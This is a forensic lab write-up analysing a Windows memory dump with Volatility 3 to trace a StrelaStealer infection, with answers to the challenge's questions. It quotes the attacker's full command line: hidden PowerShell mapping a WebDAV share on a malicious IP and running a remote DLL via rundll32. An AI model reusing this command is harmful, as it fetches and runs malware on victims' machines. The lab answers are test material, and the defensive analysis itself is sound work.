# Scenario & Objective

You are a forensic investigator at a financial institution, and your SIEM flagged unusual activity on a workstation with access to sensitive financial data. Suspecting a breach, you received a memory dump from the compromised machine. Your task is to analyze the memory for signs of compromise, trace the anomaly's origin, and assess its scope to contain the incident effectively.

- **Category**: Endpoint Forensics
- **Tools**: Volatility 3, IP location, VirusTotal, ThreatFox

## Overview

At `2024-07-25 07:00:03`, the malicious processs was run by user `Elon` and parent process is `4120`. The command make the windows machine connect to the WebDAV server `45.9.74.32` through port `8888`. It also executed the DLL file `3435.dll`. 

The WebDAV server has IP `45.9.74.32` and it was flagged as malware by 16/91 vendors. And the malicious file `3435.dll` is belonged to `StelaStealer` malware. 

# Analysis

At first, I check the `pslist` and `pstree` but it seems like nothings suspicious. As the scenario, the SIEM flagged unusual activity on a host with access to sensitive financial data, which means the malware was running at that time. So there is exist a command to run the malware, that why I check the plugin `windows.cmdline`, and I found the `net.exe` and `powershell.exe` processes with PID `2416`, `3692` respectively.
<p align="center">
  <img src="./Assets/Image 1 - Suspicious processes.webp" alt="Suspicious processes" /> <br />
  <em>Image 1: Suspicious processes</em>
</p>

The `net.exe` is a process of windows that allows administrators to manage and configure system resources, services, user accounts, and network connections from an elevated command-line or script. 

The malware ran the hidden command `use \\45.9.74.32@8888\davwwwroot\`, it is used to connect a Windows machine to a remote machine with IP `45.9.74.32` through port `8888`. The symbol `@` indicates this is a WebDAV paths to specific non-standard ports. And `davwwwroot` is a build-in keyword recognized by Windows. When a Windows application accesses to a remote WebDAV server via a web address, the OS map it so it behaves like a standard local network drive. The keywork tell the Windows to communicate directly with the server root.

> WebDAV (Web-based Distributed Authoring and Versioning) is a set of extension to the HTTP protocol. It allows user to mount a remote web or cloud as a local drive. This enable user to collaboratively open, edit, move, copy and save files directly over the internet. 

Simultaneously, the malware executed another malicious dll file `3435.dll`. Moreoever, I also check the geography of the IP and found this is a malicious IP come from `Helsinki, Finland`.
<p align="center">
  <img src="./Assets/Image 2.1 - Malicious IP.webp" alt="Malicious IP" /> <br />
  <img src="./Assets/Image 2.2 - Geography of malicious IP.webp" alt="Geography of malicious IP" /> <br />
  <em>Image 2: Malicious server</em>
</p>

So what is the malware that ran the command above in powershell. To find that, I check the plugin `windows.pstree` agains. I found the timestamp `2024-07-25 07:00:03` of the malicious process `powershell.exe` and the timestamp `2024-07-25 07:00:03` of child process `net.ext`.
<p align="center">
  <img src="./Assets/Image 3 - Timestamp of malware executed.webp" alt="Timestamp of malware executed" /> <br />
  <em>Image 3: Timestamp of malware executed</em>
</p>

I know the PPID of malicious process is `4120` but I cannot find what is the process with PID `4120`.

Then I want to check who execute the malicious process. I used plugin `getsid` and found user `Elon` ran the process.
<p align="center">
  <img src="./Assets/Image 4 - User ran the malware.webp" alt="User ran the malware" /> <br />
  <em>Image 4: User ran the malware</em>
</p>

As you can see, this user have many permission. He has the `Domain Users`, which means he is a part of the Domain Users group, allowing access to domain resources. He also has `Administrator` and `Member of Administrators` confirmed that he can access litterally every resources in the network.

I want to know more about the malware. So I search `45.9.74.32@8888/3435.dll` in the Internet and found the malware is `StrelaStealer`.
<p align="center">
  <img src="./Assets/Image 5 - Malware information.webp" alt="Malware information" /> <br />
  <em>Image 5: Malware information</em>
</p>

# Answer the Questions

**Q1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?**

The malicious process is `powershell.exe`.

**Q2: Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?**

From the image 3, the PPID of `powershell.exe` is `4120`.

**Q3: Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?**

It is `3435.dll`.

**Q4: Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?**

It is `davwwwroot`.

**Q5: What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?**

The command line argument of the malicious process, `powershell.exe`, is `powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundl32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`. 

Therefore, the key activity here is the use of `rundll32.exe` to load and execute a DLL from a remote location, which directly maps to the MITRE ATT&CK technique `T1218.011`.

**Q6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?**

It is `Elon`.

**Q7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?**

It is `StrelaStealer`.